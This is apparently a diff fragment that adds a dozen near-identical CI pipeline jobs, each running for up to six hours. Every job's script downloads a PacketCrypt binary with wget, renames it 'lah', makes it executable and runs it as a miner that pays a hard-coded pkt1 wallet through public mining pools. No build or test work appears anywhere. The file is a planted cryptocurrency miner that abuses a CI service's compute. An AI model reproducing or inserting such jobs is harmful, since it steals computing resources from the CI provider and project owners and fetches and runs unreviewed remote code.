+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: do
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p  pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: dp
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: dq
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: dr
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: ds
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: dt
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: du
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: dv
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: dw
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: dx
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: dy
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p  pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
